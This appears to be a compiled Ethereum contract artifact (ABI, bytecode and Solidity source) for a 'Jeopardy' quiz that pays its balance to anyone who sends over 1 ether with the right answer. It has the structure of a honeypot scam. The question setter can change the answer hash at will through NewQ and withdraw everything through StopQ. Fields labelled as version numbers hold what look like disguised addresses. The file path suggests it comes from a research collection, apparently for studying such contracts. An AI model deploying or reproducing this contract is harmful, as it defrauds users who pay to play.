{
  "contractName": "Jeopardy",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "QuizQuestion",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "answer",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "StartQ",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopQ",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQ",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052736326e3367063c8166a8a6304858fef6363e3fbbd60035573633e3ee859631f1c827f63f50ab247633fad9ae060045534801561004057600080fd5b506106d9806100506000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631bc4c81b1461006f5780632add78bb146100ff5780633853682c146101a157806358e756b6146101fd5780638df208b714610267575b005b34801561007b57600080fd5b50610084610271565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100c45780820151818401526020810190506100a9565b50505050905090810190601f1680156100f15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61019f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061030f565b005b6101fb600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506103eb565b005b610265600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929080356000191690602001909291905050506104d4565b005b61026f610551565b005b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103075780601f106102dc57610100808354040283529160200191610307565b820191906000526020600020905b8154815290600101906020018083116102ea57829003601f168201915b505050505081565b60006001026000546000191614156103e757806040518082805190602001908083835b6020831015156103575780518252602082019150602081019050602083039250610332565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206000816000191690555081600190805190602001906103a4929190610608565b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b806040518082805190602001908083835b60208310151561042157805182526020820191506020810190506020830392506103fc565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600019166000546000191614801561046d5750670de0b6b3a764000034115b156104d1573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104cf573d6000803e3d6000fd5b505b50565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561054d578160019080519060200190610540929190610608565b5080600081600019169055505b5050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610606573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610604573d6000803e3d6000fd5b505b565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a723058206030e3b64a3ab6bcaa710385c4c5d780bebe30f1535ef1fad7afd665361153a70029",
  "source": "\n\ncontract Jeopardy\n{\n    bytes32 responseHash;\n    string public QuizQuestion;\n    address questionSender;\n\n    function Try(string answer)\n    public payable {\n        if (responseHash == keccak256(answer) && msg.value > 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n \n    function StartQ(string question, string response)\n    public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(response);\n            QuizQuestion = question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function StopQ()\n    public payable {\n        if (msg.sender == questionSender) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function NewQ(string question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender == questionSender) {\n            QuizQuestion = question;\n            responseHash = _responseHash;\n        }\n    }\n\n    function () public payable { }\n    uint256  versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;\n    uint256  versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x590d1d5ba0feb249d42c527ae21d12f2e5768a87/contracts/0x590d1d5ba0feb249d42c527ae21d12f2e5768a87.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:54:36.316Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}